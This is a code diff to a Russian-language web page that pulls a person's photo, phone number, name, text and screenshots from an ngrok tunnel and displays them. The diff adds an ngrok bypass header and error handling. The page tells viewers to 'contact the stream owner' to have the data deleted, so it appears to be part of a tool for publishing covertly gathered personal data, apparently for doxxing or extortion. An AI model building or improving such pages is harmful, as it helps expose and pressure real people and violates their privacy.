@@ -48,6 +48,7 @@
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         .footer { color: #555; font-size: 10px; margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
         .warning { color: #ff3355; font-size: 12px; margin-top: 10px; padding: 10px; border: 1px solid rgba(255,51,85,0.2); border-radius: 8px; background: rgba(255,51,85,0.05); }
+        .size-info { color: #666; font-size: 11px; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -84,7 +85,10 @@
         
         <div class="warning">⚡ Для удаления данных обратитесь к владельцу стрима</div>
         
-        <div class="footer">Система активирована • Время публикации: <span id="time"></span></div>
+        <div class="footer">
+            Система активирована • Время публикации: <span id="time"></span>
+            <div class="size-info" id="sizeInfo"></div>
+        </div>
     </div>
 
     <script>
@@ -100,21 +104,38 @@
             // ============================================================
             // 1. ЗАГРУЖАЕМ ФОТО С СЕРВЕРА
             // ============================================================
-            // ===== ВСТАВЬ СВОЙ NGROK АДРЕС! =====
+            // ===== ВСТАВЬ СВОЙ НОВЫЙ NGROK АДРЕС! =====
             const NGROK_URL = 'https://8260-178-88-32-33.ngrok-free.app';
             
             // ФОТО
             const photoUrl = `${NGROK_URL}/photo/${shortId}`;
             console.log('📸 Запрос фото:', photoUrl);
             
-            const img = document.createElement('img');
-            img.src = photoUrl;
-            img.alt = 'Фото пользователя';
-            img.onerror = function() {
-                this.parentElement.innerHTML = '<span>❌ Фото не найдено</span>';
-            };
-            document.getElementById('userPhoto').innerHTML = '';
-            document.getElementById('userPhoto').appendChild(img);
+            // ДОБАВЛЯЕМ ЗАГОЛОВОК ДЛЯ NGROK!
+            const headers = new Headers();
+            headers.append('ngrok-skip-browser-warning', 'true');
+            
+            fetch(photoUrl, { headers })
+                .then(response => {
+                    console.log('📸 Статус ответа фото:', response.status);
+                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                    return response.blob();
+                })
+                .then(blob => {
+                    console.log('📸 Фото получено, размер:', blob.size, 'байт');
+                    const img = document.createElement('img');
+                    img.src = URL.createObjectURL(blob);
+                    img.alt = 'Фото пользователя';
+                    img.onerror = function() {
+                        this.parentElement.innerHTML = '<span>❌ Ошибка загрузки фото</span>';
+                    };
+                    document.getElementById('userPhoto').innerHTML = '';
+                    document.getElementById('userPhoto').appendChild(img);
+                })
+                .catch(error => {
+                    console.error('❌ Ошибка загрузки фото:', error);
+                    document.getElementById('userPhoto').innerHTML = '<span>❌ Фото не найдено</span>';
+                });
             
             // ============================================================
             // 2. ЗАГРУЖАЕМ ДАННЫЕ (ТЕЛЕФОН, ИМЯ, ТЕКСТ)
@@ -122,8 +143,9 @@
             const dataUrl = `${NGROK_URL}/${shortId}`;
             console.log('📡 Запрос данных:', dataUrl);
             
-            fetch(dataUrl)
+            fetch(dataUrl, { headers })
                 .then(response => {
+                    console.log('📡 Статус ответа данных:', response.status);
                     if (!response.ok) throw new Error(`HTTP ${response.status}`);
                     return response.json();
                 })
@@ -141,17 +163,28 @@
                             data.screenshots.forEach(src => {
                                 const img = document.createElement('img');
                                 img.src = 'data:image/jpeg;base64,' + src;
+                                img.onerror = function() {
+                                    this.outerHTML = `<div class="empty">❌ Ошибка загрузки скриншота</div>`;
+                                };
                                 container.appendChild(img);
                             });
                         }
+                    } else {
+                        document.getElementById('userData').textContent = '❌ Данные не найдены';
                     }
                 })
                 .catch(error => {
-                    console.error('❌ Ошибка:', error);
-                    document.getElementById('userData').textContent = '❌ Ошибка загрузки';
+                    console.error('❌ Ошибка загрузки данных:', error);
+                    document.getElementById('userData').textContent = '❌ Ошибка загрузки: ' + error.message;
+                    document.getElementById('userPhone').textContent = '❌ Ошибка';
+                    document.getElementById('userName').textContent = '❌ Ошибка';
                 });
+        } else {
+            document.getElementById('userData').textContent = '❌ Нет ID для загрузки';
+            console.log('❌ shortId не найден в URL');
         }
         
+        // ===== ВРЕМЯ =====
         document.getElementById('time').textContent = new Date().toLocaleString('ru-RU');
     </script>
 </body>
